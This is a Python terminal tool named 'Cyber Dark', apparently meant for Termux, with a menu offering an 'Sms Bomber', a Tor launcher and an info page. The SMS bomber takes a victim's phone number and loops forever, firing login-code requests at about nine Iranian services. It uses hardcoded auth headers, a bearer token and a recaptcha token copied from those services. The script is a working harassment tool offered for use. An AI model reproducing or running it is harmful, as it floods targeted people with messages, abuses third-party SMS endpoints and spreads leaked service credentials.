import os , time 
from colorama import Fore,init
os.system('clear')
print(f"{Fore.RED}[-] Upgradeing pip !")
os.system('python3 -m pip install --upgrade pip')
os.system('clear')
print(f'{Fore.GREEN}[+] Upgraded pip\n{Fore.RED}[-] Downlaoding pytz !')
os.system('pip install pytz')
os.system('clear')
print(f"{Fore.GREEN}[+] pip Upgraded \n[+] Downlaoded pytz {Fore.RED}\n[-] Downlaoding colorama !")
os.system('pip install colorama')
os.system('clear')
print(f"{Fore.GREEN}[+] pip Upgraded ! \n[+] Downlaoded pytz \n[+] colorama Downlaoded !\n{Fore.RED}[-] Downlaoding requests !")
os.system('pip install requests')
os.system('clear')
print(f"{Fore.GREEN}[+] pip Upgraded ! \n[+] Downlaoded pytz \n[+] colorama Downlaoded !\n[+] Downlaoded requests !\n{Fore.RED}[-] Downlaoding Tor")
os.system('pkg install tor')
time.sleep(2)
os.system('clear')
import requests , datetime
from datetime import datetime
from pytz import timezone
init()
def telegram() :
    iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
    start_or_end = int(input(f'''{Fore.BLUE}
Ready to get started?
[1] Yes 
[2] No
{Fore.RED}
┌─<'''+iran_time+'''>[~/Cyber Dark/Telegram anti-filter]
└──╼ ❯❯❯ '''))
    if start_or_end == 1 :
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        print(f'''[{iran_time}] Tor started !''')
        os.system('tor HTTPTunnelPort 9051')
    else : 
        banner()
def SB() :
    iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
    num = str(input('''
              _,.
            ,` -.)
           ( _/-\-._
          /,|`--._,-^|            ,
          \_| |`-._/||          , |
            |  `-, / |         /  /
            |     || |        /  /
             `r-._||/   __   /  /
         __,-<_     )`-/  `./  /
         \   `---    \   / /  /
            |           |./  /
            /           //  /
        \_/  \         |/  /
         |    |   _,^- /  /
         |    , ``  (\/  /_
          \,.->._    \X-=/^
          (  /   `-._//^`
           `Y-.____(__}
            |     {__)
                  ()
                  
                   Sms Bomber !
         ┌─<'''+iran_time+'''>[~/Cyber Dark/Sms bomber]
         └──╼ Enter the number ❯❯❯ '''))
        
    s = "0" + num.split("98")[1]
    s = str(s)
    qq = "+" + num
    #-----SHAD-----#
    urlSHAD = "https://shadmessenger1.iranlms.ir/"
    jcSHAD = {"api_version":"3","method":"sendCode","data":{"phone_number":str(num),"send_type":"SMS"}}
    hedSHAD = {
    "Host": "shadmessenger1.iranlms.ir",
    "content-length": "96",
    "accept": "application/json, text/plain, */*",
    "save-data": "on",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "content-type": "text/plain",
    "origin": "https://web.shad.ir",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://web.shad.ir/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7"}
    #-----DIGIPAY-----#
    urlDIGI = "https://app.mydigipay.com/digipay/api/users/send-sms"
    jcDIGI = {"cellNumber":s,"device":{"deviceId":"a16e6255-17c3-431b-b047-3f66d24c286f","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}
    hedDIGI = {
    "Host": "app.mydigipay.com",
    "Connection": "keep-alive",
    "Content-Length": "158",
    "Agent": "WEB",
    "Digipay-Version": "2020-11-29",
    "Client-Version": "1.0.0",
    "Authorization": "Basic d2ViYXBwLWNsaWVudC1pZDp3ZWJhcHAtY2xpZW50LXNlY3JldC1kZWJlZTc5ZC1iMDRkLTQ3ZWYtOGVkNS1jMzJlMjRlYzgzNmU\u003d",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Save-Data": "on",
    "Origin": "https://app.mydigipay.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://app.mydigipay.com/auth/login",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7",}
    #-----SNAP LINK-----#
    urlSNAPL = "https://api.snapp.ir/api/v1/sms/link"
    jcSNAPL = {"phone":s}
    hedSNAPL = {
        "Host": "api.snapp.ir",
        "content-length": "23",
        "accept": "application/json",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://snapp.ir",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://snapp.ir/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7",}
    #-----TPCI-----#
    urlTP = "https://api.tapsi.cab/api/v2/user"
    jcTP = {"credential":{"phoneNumber":s,"role":"PASSENGER"}}
    hedTP = {
        "Host": "api.tapsi.cab",
        "Connection": "keep-alive",
        "Content-Length": "63",
        "x-agent": "v2.2|passenger|WEBAPP|3.12.4||5.0",
        "Save-Data": "on",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://app.tap30.org",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://app.tap30.org/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7",}
    
    #-----DIVAR-----#
    urlD = "https://api.divar.ir/v5/auth/authenticate"
    jcD = {"phone":s}
    hedD = {
        "Host": "api.divar.ir",
        "content-length": "23",
        "accept": "application/json",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://chat.divar.ir",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://chat.divar.ir/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7",}
    #-----RUBIKA-----#
    urlRU = "https://messengerg2c42.iranlms.ir/"
    jcRU = {"api_version":"3","method":"sendCode","data":{"phone_number":num,"send_type":"SMS"}}
    hedRU = {
        "Host": "messengerg2c42.iranlms.ir",
        "content-length": "96",
        "accept": "application/json, text/plain, */*",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
        "content-type": "text/plain",
        "origin": "https://web.rubika.ir",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://web.rubika.ir/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7",}
    #-----BAZAR-----#
    urlBZ = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
    jcBZ = {"properties":{"language":2,"clientID":"qr3vr2piqfqtulq8htgjrv4biqmp1xtz","deviceID":"qr3vr2piqfqtulq8htgjrv4biqmp1xtz","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":num}}}
    hedBZ = {
        "Host": "api.cafebazaar.ir",
        "content-length": "210",
        "accept": "application/json, text/plain, */*",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
        "content-type": "application/json;charset\u003dUTF-8",
        "origin": "https://cafebazaar.ir",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://cafebazaar.ir/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7",}
    #-----WISGOON-----#
    urlWIS = "https://gateway.wisgoon.com/api/v1/auth/login/"
    jcWIS = {"phone":s,"recaptcha-response":"03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg","token":"e622c330c77a17c8426e638d7a85da6c2ec9f455"}
    hedWIS = {
        "Host": "gateway.wisgoon.com",
        "content-length": "582",
        "accept": "application/json",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://m.wisgoon.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.wisgoon.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7",}
    #-----SNAP FOOD-----#
    urlFOD = "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.3.2&optionalVersion=5.3.2&UDID=4b1810a2-7e13-4f82-8733-717791b8f578"
    hedFOD = {
        "Host": "snappfood.ir",
        "content-length": "37",
        "accept": "application/json, text/plain, */*",
        "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImUyMTAxN2JiZDBmZDhiZDJhZWJkOTNhZjY5OTFmMmUxYWI5ODMxZWFkOWI1N2Y5M2Q5YjJiYzllNGNhZTg1NDM0NTE5ZDM5ZTAyYTNhOTVlIn0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiZTIxMDE3YmJkMGZkOGJkMmFlYmQ5M2FmNjk5MWYyZTFhYjk4MzFlYWQ5YjU3ZjkzZDliMmJjOWU0Y2FlODU0MzQ1MTlkMzllMDJhM2E5NWUiLCJpYXQiOjE2MDg1NjU1MjgsIm5iZiI6MTYwODU2NTUyOCwiZXhwIjoxNjExMjQ0MDQ4LCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.Oi2_U4BnPADcbMJqPvuxhbqhoQPu94v7G8IgQ-L40wrtPsPsUsRbLNs_EQ2J4lV7z_uqSp5wivafzAOa9vvU8wsfg6gZ3Mff0k1gAYp8tGzdHh-IT0GhwPcOzn1Uemtic02QT-z0r21kWbJ3t2OEEAt60GLEnl2IhoUIrN7Wa_vQGIzYl0Z05GnaWFnadtYUz3d_mpWEWbLf8CaW-Yikw53coi72Jf9bRIgV5ZzuKfEKzU16YSVJmvIiDrCG0gFw2qWWB5_4-axlDD8fIJ0PkyxInjrheYM3q8Ucb-Nc6Z-W3Ho3zvr2n-YQNrzywDwwzygojH_w2iI12wiG8MsxLaawci6fozhLjS5jcE1RV-3IF1c2Vn3YO9ZZv9Tc5zDt63MxZIEFLWxk6i656PukrDq0YVUQlNz9pxkyey2doenG--gdtNvZOhgGaY4iYTqPxYgF52qtEJ8x1HEt156cGvI4kA32c2pI33GIFjUrDyEyEXXWlvshPS8l0xq7wC9aN9TkiFsxop93TdPDnIH0BH2O3xZ1UwmSMVTQ2oPL-u_2SNbNbceVwZhSm_KbB8403OmLEVFzvZD1CPEk6bZqhqHa_kkWgEBO965tS_ubDX41R1iV1UKL1dWInzAk_ivSccNICTfvS2-IlytLaqLLIub_95OSiPoxNHzNfn_D16i7CC3jfwdosyHQfJoL3Ncch__Cp8v4YpTdWM8baR-2dbMYU3IpulooAQS9TZHk4wYjdtNgAtcrTm0v4TOUjNqOoYnqA0OId59ZVWpZHShgV0dD9LGuGXDCrQcDGZ9XTkFoZOloTt38vlZ9wJd-aNNWZl8j-W3NUNAPVxT-bv_DhVBYDWfTD37dQP6eLGR9QEzzeC5b0rykg0gGHX8m-AZ0LuXeIr4wW8N5Wx5n9SH3VP8sDS2oEEDcKKw2fuz-znc_seMPZmkg9-xbRwmXnivxxMh1UmKsLAwnBCFGJRHMP7AO7Yn8zHGpZ5N-hCRGRR_CYx4_RQxb78IDcVQwpylTp5V5Jx2hhTLP6vhYkYREsaWnx4c1VZoPlC7L0lCOPWO9j5_Rs7oFIvgzNIlqhAER9iLEVWqiyDzeeUR-LSUX87cJvDILbCPA0OPbc9v1skW4XyDKqV1P9TUeO-Qz2LmOSpWP0WAfzbKcShaBlwSpSpKrGO91_wg5Xf-AQ6nfMcZc5NuxpbC9zC3lcFcww1S0ZWzq5Lthb78QVFJqR_KP7mexGoIpSYjcGFK8k9EcFAn0PpiimqV6g2ODftE12w81mBD3unwPhEiRFLxFpful1GeSItj7cA0CZizVRDIV-pwmOYrk763fOIohLukn5jhz-7R4n3_uQ91XT3VGfBeu4bZesmeMx2J74tkK-ohPghCRPF5htun9ZFXvFc7db-c5G5pPEeBydcEEXsweYRBdlGxeDhbEbFK8m4z059PAzJgu8KZa_pvA8kNd2RjVkYzZTQuCjw-L8gqZhTSV0JL-SjYtbGQu2KMa3I-1CcYTcqKeBgaFCWUXoWeSPLLEDPDE4TU10uX9hT7Ikq9y3nChJSz1FofpW11gj2XEiqfb314SmDEGpCQSzZiJbzRxtFnWhq-tZXayy4mVlHACHpuK3looJ108fQ1PJeHrjLigaylNreQSCewZJuEoeLgDBSAGl2PmST9WGI7Zdicfb8aZmCuGM8Xb56Unsv7fgKX83f09zigy5K7aY061M6aOnGOTCTDGPy07UzUEwikKwDQ3e7dfQjjMdsH-rWa-q6aHghm-8ZNkoIrG_MLzwmDrvPWI_7NiinFdUmLUJ3HTzJ0SW1684tjwACJqSKNSjebvbvhf1T4swtZkqw-vS69q4R8dhCR9ZgU9hIBDmKlG7LwnH4HN6TB-qlKu9tKJHTO4lfx8w53GvKLENZQWLGBIIpuTL1bQ3MHAZwpArsTLQBmgTY-7XVrm8aFlNSDygP9L88ICmHFa3oA7CAZXFWVmtceIIkxafTo8SDO-101F4Efbw4We1O-6pd7b_IY2ZgXjBpnbw_Ue6koPsicXd1KEP6oUqlkJlgCfFRf_AW8iZ2K5HyQh6IdmE9Yu9fgqFfUWNv986Rex5Po3IXDx5e4rmPgrHih-STkDKZy3xvNlsBX1DstNbq7nHpc9AIxUYf-YxZLGCvMwK1nZ3aT0oKzOPgnIF9HqeUmhBI4TWZC0e4ZcKFt3-T-cwWtKJIVWpDv_31a7fenJSG-_SqAH5sGw6dixtf1EJE6Wq_ix3XxVUIib_UHrve-w0seeVMw8hWNpTJNHuBXrcy57BSb8S1aHUAbu2-eT9mo9c0Z8Tp3gepGXQHyOeF4WLrJ-wuT2_UkgLz2nqBFX3YjmnLgASvsKi1CRdFKEbPvhEB2mdmyQ_2r2wBFTt6WvHYs53BfcKx0a06vY8871QPLUr3Elu0k0UWlQlZVEGOauhR2YF7ZAQHKOHL2_6csFQIQAi-RaNg7Dn_-iFBZznMFD6Q_GCDZnC1e-uPqLteQXgrB47rPhtIFDYut2kVV580EIq8e59u2oZaAKSzZk9dT8sO8SaAXac7P4yg8Cs8_EHNj3xL-MTJPPpDHCBymwDmgjmJugLteJmSk2zC8blWcOfQYz3Yxu2T0UHUPBfT3O1lgZxNJQ5G9NNkum1hVM3Myk0rlI1rhK3JLUNRIZnf2axFqB_ZGSUyz9siRHp_giPMMaS2GAtMCGR7Mtc4uoARDrJYino8IIx4M",
        "dpr": "2",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
        "viewport-width": "360",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://m.snappfood.ir",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.snappfood.ir/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7",}
    #-----SNAP FOOD-----#
    cc = ("cellphone=")
    gg = cc + s
    #-----------------------------#
    #-----------------------------#
    #-----------------------------#
    #-----------------------------#
    #-----------------------------#
    #-----------------------------#
    #-----------------------------#
    #-----------------------------#
    #-----------------------------#
    #-----------------------------#
    while True:
        q = requests.post(urlSHAD, headers=hedSHAD, json=jcSHAD)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        if q.status_code == 200 : 
            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--SHAD--#
        w = requests.post(urlDIGI, headers=hedDIGI, json=jcDIGI)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")

        if w.status_code == 200 : 

            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--DIGIPAY--#
        e = requests.post(urlSNAPL, headers=hedSNAPL, json=jcSNAPL)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        if e.status_code == 200 : 
            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--LINK SNAP--#
        t = requests.post(urlTP, headers=hedTP, json=jcTP)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        if t.status_code == 200 : 
            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--TPCI--#
        u = requests.post(urlD, headers=hedD, json=jcD)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        if u.status_code == 200 : 
            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--DIVAR--#
        i = requests.post(urlRU, headers=hedRU, json=jcRU)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        if i.status_code == 200 : 
            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--RUBIKA--#
        o = requests.post(urlBZ, headers=hedBZ, json=jcBZ)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        if o.status_code == 200 : 
            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--BAZAR--#
        p = requests.post(urlWIS, headers=hedWIS, json=jcWIS)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        if p.status_code == 200 : 
            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--WIGON--#
        z = requests.post(urlFOD, headers=hedFOD, data=gg)
        iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
        if z.status_code == 200 : 
            print(f'{Fore.GREEN}[{iran_time}]#+# Sended')
        else : 
            print(f'{Fore.RED}[{iran_time}]#-# Error ')
    #--SNAP FOOD--#
#----------Info----------#
def info() :
    iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")
    exit_or_back = input(f'''{Fore.RED}
    Name --> [Cyber Dark]
    Coded by --> [Virus 1386]
    Telegram Channel --> [@CyberDarker]
    Telegram Support --> [@Virus1386 and @Virus_1386]
    Version --> [0.0.3]
    
    
    [1] Back
    [2] Exit
    {Fore.RED}
    ┌─<{iran_time}>[~/Cyber Dark/Info]
    └──╼ ❯❯❯ ''')
    if exit_or_back == '1'  :
    	banner()
    elif exit_or_back == '2'  : 
    	os.system('clear')
#----------Banner----------#
def banner() :
     os.system('clear')
     from datetime import datetime
     from pytz import timezone
     iran_time = datetime.now(timezone("Iran")).strftime("%H:%M:%S")

     work = int(input(f'''{Fore.RED}
   ______      __                 ____             __  
  / ____/_  __/ /_  ___  _____   / __ \____ ______/ /__
 / /   / / / / __ \/ _ \/ ___/  / / / / __ `/ ___/ //_/
/ /___/ /_/ / /_/ /  __/ /     / /_/ / /_/ / /  / ,<   
\____/\__, /_.___/\___/_/     /_____/\__,_/_/  /_/|_|  
     /____/
{Fore.GREEN}
╔═══════════════════════════╗
║          {iran_time}         ║
╚═══════════════════════════╝

     {Fore.BLUE}
[1] Sms Bomber 
[2] Telegram anti-filter
[3] Info
[4] Exit
{Fore.RED}
┌─<{iran_time}>[~/Cyber Dark/Main]
└──╼ ❯❯❯ '''))
     if work == 1 :
         SB()
     elif work == 2 :
         telegram()
     elif work == 3 :
         info()
     elif work == 4 :
         os.system('clear')
banner()
